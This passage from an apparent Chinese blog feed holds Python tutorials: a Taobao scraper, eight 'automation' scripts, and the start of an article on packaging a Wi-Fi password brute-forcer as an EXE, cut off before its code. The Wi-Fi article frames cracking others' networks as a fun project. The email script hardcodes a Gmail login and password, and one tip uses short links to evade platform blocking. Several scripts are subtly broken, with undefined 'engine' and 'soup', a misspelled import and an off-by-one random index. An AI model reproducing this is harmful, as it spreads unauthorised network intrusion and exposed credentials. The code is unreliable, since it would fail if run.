class="string">&#x27;//div[@class=&quot;grid g-clearfix&quot;]/div/div&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用 for 循环遍历取值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> div <span class="keyword">in</span> divs:  <span class="comment"># 二次提取</span></span><br><span class="line">    title = div.find_element_by_xpath(<span class="string">&#x27;.//div[@class=&quot;row row-2 title&quot;]/a&#x27;</span>).text</span><br><span class="line">    price = div.find_element_by_xpath(<span class="string">&#x27;.//strong&#x27;</span>).text + <span class="string">&#x27;元&#x27;</span>  <span class="comment"># 商品价格  # 手写</span></span><br><span class="line">    deal = div.find_element_by_xpath(<span class="string">&#x27;.//div[@class=&quot;deal-cnt&quot;]&#x27;</span>).text  <span class="comment"># 付款人数  # 手写</span></span><br><span class="line">    name = div.find_element_by_xpath(<span class="string">&#x27;.//div[@class=&quot;shop&quot;]/a/span[2]&#x27;</span>).text  <span class="comment"># 店铺名称  # 手写</span></span><br><span class="line">    location = div.find_element_by_xpath(<span class="string">&#x27;.//div[@class=&quot;location&quot;]&#x27;</span>).text  <span class="comment"># 店铺地址  # 手写</span></span><br><span class="line">    detail_url = div.find_element_by_xpath(<span class="string">&#x27;.//div[@class=&quot;pic&quot;]/a&#x27;</span>).get_attribute(<span class="string">&#x27;href&#x27;</span>)  <span class="comment"># 详情页地址  # 手写</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(title, price, deal, name, location, detail_url)</span><br></pre></td></tr></table></figure><p>运行代码，可以看到获取的数据了</p><img src="https://img-blog.csdnimg.cn/img_convert/25286a8350978b3dc267e23cf15c1c71.png"><h2 id="6-最后一步，保存数据"><a href="#6-最后一步，保存数据" class="headerlink" title="6. 最后一步，保存数据"></a>6. 最后一步，保存数据</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;淘宝.csv&#x27;</span>, mode=<span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    csv_write = csv.writer(f)  <span class="comment"># 实例化csv模块写入对象</span></span><br><span class="line">    csv_write.writerow([title, price, deal, name, location, detail_url])</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/img_convert/e1275c32330609961c3063fd2ec19a44.png">]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8个自动化python脚本提升工作效率</title>
      <link href="/archives/a2526ebd.html"/>
      <url>/archives/a2526ebd.html</url>
      
        <content type="html"><![CDATA[<h1 id="8-个自动化-python-脚本提升工作效率"><a href="#8-个自动化-python-脚本提升工作效率" class="headerlink" title="8 个自动化 python 脚本提升工作效率"></a>8 个自动化 python 脚本提升工作效率</h1><h2 id="使用自动化脚本，就无需手动一次又一次地完成这些任务，"><a href="#使用自动化脚本，就无需手动一次又一次地完成这些任务，" class="headerlink" title="使用自动化脚本，就无需手动一次又一次地完成这些任务，"></a>使用自动化脚本，就无需手动一次又一次地完成这些任务，</h2><blockquote><p>非常方便啊有木有？！</p></blockquote><blockquote><p>而在某种程度上，Python 就是自动化的代名词。</p></blockquote><blockquote><p>今天就来和大家一起学习一下，</p></blockquote><blockquote><p>用 8 个 python 自动化脚本提高工作效率~ 快乐摸鱼~</p></blockquote><h2 id="1、自动化阅读网页新闻"><a href="#1、自动化阅读网页新闻" class="headerlink" title="1、自动化阅读网页新闻"></a>1、自动化阅读网页新闻</h2><p>这个脚本能够实现从网页中抓取文本，然后自动化语音朗读，当你想听新闻的时候，这是个不错的选择。</p><p>代码分为两大部分，第一通过爬虫抓取网页文本呢，第二通过阅读工具来朗读文本。</p><h3 id="需要的第三方库："><a href="#需要的第三方库：" class="headerlink" title="需要的第三方库："></a>需要的第三方库：</h3><ul><li><code>Beautiful Soup</code> - 经典的 HTML&#x2F;XML 文本解析器，用来提取爬下来的网页信息</li><li><code>requests</code> - 好用到逆天的 HTTP 工具，用来向网页发送请求获取数据</li><li><code>Pyttsx3</code> - 将文本转换为语音，并控制速率、频率和语音</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyttsx3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">voices = engine.getProperty(<span class="string">&#x27;voices&#x27;</span>)</span><br><span class="line">newVoiceRate = <span class="number">130</span>                       <span class="comment">## Reduce The Speech Rate</span></span><br><span class="line">engine.setProperty(<span class="string">&#x27;rate&#x27;</span>,newVoiceRate)</span><br><span class="line">engine.setProperty(<span class="string">&#x27;voice&#x27;</span>, voices[<span class="number">1</span>].<span class="built_in">id</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">audio</span>):</span><br><span class="line">  engine.say(audio)</span><br><span class="line">  engine.runAndWait()</span><br><span class="line">text = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;Paste article\n&quot;</span>))</span><br><span class="line">res = requests.get(text)</span><br><span class="line"></span><br><span class="line">articles = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(soup.select(<span class="string">&#x27;.p&#x27;</span>))):</span><br><span class="line">    article = soup.select(<span class="string">&#x27;.p&#x27;</span>)[i].getText().strip()</span><br><span class="line">    articles.append(article)</span><br><span class="line">text = <span class="string">&quot; &quot;</span>.join(articles)</span><br><span class="line">speak(text)</span><br><span class="line"><span class="comment"># engine.save_to_file(text, &#x27;test.mp3&#x27;) ## If you want to save the speech as a audio file</span></span><br><span class="line">engine.runAndWait()</span><br></pre></td></tr></table></figure><h2 id="2、自动化数据探索"><a href="#2、自动化数据探索" class="headerlink" title="2、自动化数据探索"></a>2、自动化数据探索</h2><p>数据探索是数据科学项目的第一步，你需要了解数据的基本信息才能进一步分析更深的价值。</p><p>一般我们会用<code>pandas</code>、<code>matplotlib</code>等工具来探索数据，但需要自己编写大量代码，如果想提高效率，<code>Dtale</code>是个不错的选择。</p><p>Dtale 特点是用一行代码生成自动化分析报告，它结合了 Flask 后端和 React 前端，为我们提供了一种查看和分析<code>Pandas数据结构</code>的简便方法。</p><p>我们可以在<code>Jupyter</code>上实用 Dtale。</p><p>需要的第三方库：</p><ul><li><code>Dtale</code> - 自动生成分析报告</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### Importing Seaborn Library For Some Datasets</span></span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="comment">### Printing Inbuilt Datasets of Seaborn Library</span></span><br><span class="line"><span class="built_in">print</span>(sns.get_dataset_names())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### Loading Titanic Dataset</span></span><br><span class="line">df=sns.load_dataset(<span class="string">&#x27;titanic&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Importing The Library</span></span><br><span class="line"><span class="keyword">import</span> dtale</span><br></pre></td></tr></table></figure><h2 id="3、自动发送多封邮件"><a href="#3、自动发送多封邮件" class="headerlink" title="3、自动发送多封邮件"></a>3、自动发送多封邮件</h2><p>这个脚本可以帮助我们批量定时发送邮件，邮件内容、附件也可以自定义调整，非常的实用。</p><p>相比较邮件客户端，Python 脚本的优点在于可以智能、批量、高定制化地部署邮件服务。</p><p>需要的第三方库：</p><ul><li><code>Email</code> - 用于管理电子邮件消息；</li><li><code>Smtlib</code> - 向 SMTP 服务器发送电子邮件，它定义了一个 SMTP 客户端会话对象，该对象可将邮件发送到互联网上任何带有 <code>SMTP</code><br>或<code>ESMTP</code> 监听程序的计算机；</li><li><code>Pandas</code> - 用于数据分析清洗地工具；</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.message <span class="keyword">import</span> EmailMessage</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_email</span>(<span class="params">remail, rsubject, rcontent</span>):</span><br><span class="line">    email = EmailMessage()</span><br><span class="line">    email[<span class="string">&#x27;from&#x27;</span>] = <span class="string">&#x27;The Pythoneer Here&#x27;</span></span><br><span class="line">    email[<span class="string">&#x27;to&#x27;</span>] = remail</span><br><span class="line">    email[<span class="string">&#x27;subject&#x27;</span>] = rsubject</span><br><span class="line">    email.set_content(rcontent)</span><br><span class="line">    <span class="keyword">with</span> smtplib.SMTP(host=<span class="string">&#x27;smtp.gmail.com&#x27;</span>,port=<span class="number">587</span>)<span class="keyword">as</span> smtp:</span><br><span class="line">        smtp.ehlo()</span><br><span class="line">        smtp.starttls()</span><br><span class="line">        smtp.login(<span class="string">&quot;deltadelta371@gmail.com&quot;</span>,<span class="string">&quot;delta@371&quot;</span>)</span><br><span class="line">        smtp.send_message(email)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;email send to &quot;</span>,remail)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    df = pd.read_excel(<span class="string">&#x27;list.xlsx&#x27;</span>)</span><br><span class="line">    length = <span class="built_in">len</span>(df)+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> df.iterrows():</span><br><span class="line">        email = item[<span class="number">0</span>]</span><br><span class="line">        subject = item[<span class="number">1</span>]</span><br><span class="line">        content = item[<span class="number">2</span>]</span><br></pre></td></tr></table></figure><h2 id="4、将-PDF-转换为音频文件"><a href="#4、将-PDF-转换为音频文件" class="headerlink" title="4、将 PDF 转换为音频文件"></a>4、将 PDF 转换为音频文件</h2><p>脚本可以将 pdf 转换为音频文件，</p><p>原理也很简单，</p><p>首先用 <code>PyPDF</code> 提取 pdf 中的文本，</p><p>然后用 <code>Pyttsx3</code> 将文本转语音。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyttsx3,PyPDF2</span><br><span class="line">pdfreader = PyPDF2.PdfFileReader(<span class="built_in">open</span>(<span class="string">&#x27;story.pdf&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">speaker = pyttsx3.init()</span><br><span class="line"><span class="keyword">for</span> page_num <span class="keyword">in</span> <span class="built_in">range</span>(pdfreader.numPages):</span><br><span class="line">    text = pdfreader.getPage(page_num).extractText()  <span class="comment">## extracting text from the PDF</span></span><br><span class="line">    cleaned_text = text.strip().replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27; &#x27;</span>)  <span class="comment">## Removes unnecessary spaces and break lines</span></span><br><span class="line">    <span class="built_in">print</span>(cleaned_text)                <span class="comment">## Print the text from PDF</span></span><br><span class="line">    <span class="comment">#speaker.say(cleaned_text)        ## Let The Speaker Speak The Text</span></span><br><span class="line">    speaker.save_to_file(cleaned_text,<span class="string">&#x27;story.mp3&#x27;</span>)  <span class="comment">## Saving Text In a audio file &#x27;story.mp3&#x27;</span></span><br><span class="line">    speaker.runAndWait()</span><br><span class="line">speaker.stop()</span><br></pre></td></tr></table></figure><h2 id="5、从列表中播放随机音乐"><a href="#5、从列表中播放随机音乐" class="headerlink" title="5、从列表中播放随机音乐"></a>5、从列表中播放随机音乐</h2><p>这个脚本会从歌曲文件夹中随机选择一首歌进行播放，</p><p>需要注意的是 os.startfile 仅支持 Windows 系统。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line">music_dir = <span class="string">&#x27;G:\\new english songs&#x27;</span></span><br><span class="line">songs = os.listdir(music_dir)</span><br><span class="line">song = random.randint(<span class="number">0</span>,<span class="built_in">len</span>(songs))</span><br><span class="line"><span class="built_in">print</span>(songs[song])  <span class="comment">## Prints The Song Name</span></span><br><span class="line">os.startfile(os.path.join(music_dir, songs[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><h2 id="6、智能天气信息"><a href="#6、智能天气信息" class="headerlink" title="6、智能天气信息"></a>6、智能天气信息</h2><p>国家气象局网站提供获取天气预报的 API，直接返回 json 格式的天气数据。所以只需要从 json 里取出对应的字段就可以了。</p><p>下面是指定城市(县、区)天气的网址，直接打开网址，就会返回对应城市的天气数据。比如：</p><p><a href="http://www.weather.com.cn/weather1d/101020600.shtml#input">http://www.weather.com.cn/weather1d/101020600.shtml#input</a> 上海浦东新区对应的天气网址。</p><p>具体代码如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">mport requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> logging <span class="keyword">as</span> log</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weather_wind</span>(<span class="params">url</span>):</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">        log.error(<span class="string">&quot;Can&#x27;t get weather data!&quot;</span>)</span><br><span class="line">    info = json.loads(r.content.decode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get wind data</span></span><br><span class="line">    data = info[<span class="string">&#x27;weatherinfo&#x27;</span>]</span><br><span class="line">    WD = data[<span class="string">&#x27;WD&#x27;</span>]</span><br><span class="line">    WS = data[<span class="string">&#x27;WS&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#125;(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(WD, WS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weather_city</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># open url and get return data</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">        log.error(<span class="string">&quot;Can&#x27;t get weather data!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># convert string to json</span></span><br><span class="line">    info = json.loads(r.content.decode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get useful data</span></span><br><span class="line">    data = info[<span class="string">&#x27;weatherinfo&#x27;</span>]</span><br><span class="line">    city = data[<span class="string">&#x27;city&#x27;</span>]</span><br><span class="line">    temp1 = data[<span class="string">&#x27;temp1&#x27;</span>]</span><br><span class="line">    temp2 = data[<span class="string">&#x27;temp2&#x27;</span>]</span><br><span class="line">    weather = data[<span class="string">&#x27;weather&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#125; &#123;&#125; &#123;&#125;~&#123;&#125;&quot;</span>.<span class="built_in">format</span>(city, weather, temp1, temp2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    msg = <span class="string">&quot;&quot;&quot;**天气提醒**:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125; &#123;&#125;</span></span><br><span class="line"><span class="string">&#123;&#125; &#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">来源: 国家气象局</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    get_weather_city(<span class="string">&#x27;http://www.weather.com.cn/data/cityinfo/101021200.html&#x27;</span>),</span><br><span class="line">    get_weather_wind(<span class="string">&#x27;http://www.weather.com.cn/data/sk/101021200.html&#x27;</span>),</span><br><span class="line">    get_weather_city(<span class="string">&#x27;http://www.weather.com.cn/data/cityinfo/101020900.html&#x27;</span>),</span><br><span class="line">    get_weather_wind(<span class="string">&#x27;http://www.weather.com.cn/data/sk/101020900.html&#x27;</span>)</span><br><span class="line">)</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><h2 id="7、长网址变短网址"><a href="#7、长网址变短网址" class="headerlink" title="7、长网址变短网址"></a>7、长网址变短网址</h2><p>有时，那些大 URL 变得非常恼火，</p><p>很难阅读和共享，此脚本可以将长网址变为短网址。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> contextlib</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_tiny</span>(<span class="params">url</span>):</span><br><span class="line"> request_url = (<span class="string">&#x27;http://tinyurl.com/api-create.php?&#x27;</span> +</span><br><span class="line"> urlencode(&#123;<span class="string">&#x27;url&#x27;</span>:url&#125;))</span><br><span class="line"> <span class="keyword">with</span> contextlib.closing(urlopen(request_url)) <span class="keyword">as</span> response:</span><br><span class="line">  <span class="keyword">return</span> response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"> <span class="keyword">for</span> tinyurl <span class="keyword">in</span> <span class="built_in">map</span>(make_tiny, sys.argv[<span class="number">1</span>:]):</span><br><span class="line">  <span class="built_in">print</span>(tinyurl)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> main()</span><br></pre></td></tr></table></figure><p>这个脚本非常实用，</p><p>比如说有内容平台是屏蔽公众号文章的，</p><p>那么就可以把公众号文章的链接变为短链接，</p><p>然后插入其中，就可以实现绕过。</p><h2 id="8、清理下载文件夹"><a href="#8、清理下载文件夹" class="headerlink" title="8、清理下载文件夹"></a>8、清理下载文件夹</h2><p>世界上最混乱的事情之一是开发人员的下载文件夹，</p><p>里面存放了很多杂乱无章的文件，</p><p>此脚本将根据大小限制来清理您的下载文件夹，</p><p>有限清理比较旧的文件。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_list</span>(<span class="params">file_path</span>):</span><br><span class="line"><span class="comment">#文件按最后修改时间排序</span></span><br><span class="line">    dir_list = os.listdir(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> dir_list:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dir_list = <span class="built_in">sorted</span>(dir_list, key=<span class="keyword">lambda</span> x: os.path.getmtime(os.path.join(file_path, x)))</span><br><span class="line">    <span class="keyword">return</span> dir_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_size</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[summary]</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        file_path ([type]): [目录]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        [type]: 返回目录大小，MB</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    totalsize=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(file_path):</span><br><span class="line">        totalsize=totalsize+os.path.getsize(os.path.join(file_path, filename))</span><br><span class="line">    <span class="comment">#print(totalsize / 1024 / 1024)</span></span><br><span class="line">    <span class="keyword">return</span> totalsize / <span class="number">1024</span> / <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_file_size</span>(<span class="params">file_path, size_Max, size_Del</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[summary]</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        file_path ([type]): [文件目录]</span></span><br><span class="line"><span class="string">        size_Max ([type]): [文件夹最大大小]</span></span><br><span class="line"><span class="string">        size_Del ([type]): [超过size_Max时要删除的大小]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(get_size(file_path))</span><br><span class="line">    <span class="keyword">if</span> get_size(file_path) &gt; size_Max:</span><br><span class="line">        fileList = get_file_list(file_path)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fileList)):</span><br><span class="line">            <span class="keyword">if</span> get_size(file_path) &gt; (size_Max - size_Del):</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;del :%d %s&quot;</span> % (i + <span class="number">1</span>, fileList[i]))</span><br><span class="line">                <span class="comment">#os.remove(file_path + fileList[i])</span></span><br></pre></td></tr></table></figure><h3 id="文章就到这里啦，我们下篇文章再见"><a href="#文章就到这里啦，我们下篇文章再见" class="headerlink" title="文章就到这里啦，我们下篇文章再见"></a>文章就到这里啦，我们下篇文章再见</h3>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python实现暴力破解wifi密码EXE应用</title>
      <link href="/archives/b2cd5c2d.html"/>
      <url>/archives/b2cd5c2d.html</url>
      
        <content type="html"><![CDATA[<h1 id="python-实现暴力破解-wifi-密码-EXE-应用"><a href="#python-实现暴力破解-wifi-密码-EXE-应用" class="headerlink" title="python 实现暴力破解 wifi 密码 EXE 应用"></a>python 实现暴力破解 wifi 密码 EXE 应用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>python 号称是编程界的万金油，那么是否可以做个读取电脑网卡 wifi 并暴力破解的小脚本呢？在这个基础上为了方便体验是不是可以将其打包成 exe 这样方便执行的小应用呢？说干就干~</p></blockquote><h2 id="功能点预览"><a href="#功能点预览" class="headerlink" title="功能点预览"></a>功能点预览</h2><p>本文主要分享以下需求</p><ul><li>python 获取无线网卡</li><li>python 通过无线网卡获取 wifi</li><li>python 暴力破解 wifi</li><li>python 通过实现 GUI 图形界面</li><li>python 打包成 exe</li></ul><h2 id="前置准备-依赖库"><a href="#前置准备-依赖库" class="headerlink" title="前置准备-依赖库"></a>前置准备-依赖库</h2><ul><li><code>comtypes</code></li><li><code>pywifi</code></li><li><code>pyintaller</code><img src="https://img-blog.csdnimg.cn/92fe7faa95154ccd824ada42ad180a13.png"></li></ul><h2 id="Python-tkinter-编写-GUI-界面"><a href="#Python-tkinter-编写-GUI-界面" class="headerlink" title="Python tkinter 编写 GUI 界面"></a>Python tkinter 编写 GUI 界面</h2><p>本文使用 TKinter 实现<a href="https://so.csdn.net/so/search?q=GUI&spm=1001.2101.3001.7020">GUI</a> 界面，自己写界面比较麻烦，可以使用一些可视化的工具(比如 QT5)进行快速编排实现 GUI 代码自动化。</p><h2 id="密码字典"><a href="#密码字典" class="headerlink" title="密码字典"></a>密码字典</h2><p>密码字典是什么？<br>简单的说就是一个提前存放一系列密码的文本，里面全是数字、数字与字母的组合、手机号、座机号、生日等等。</p><p>本文测试时你可以自己手动创建密码字典；也可以下载以下密码字典库</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 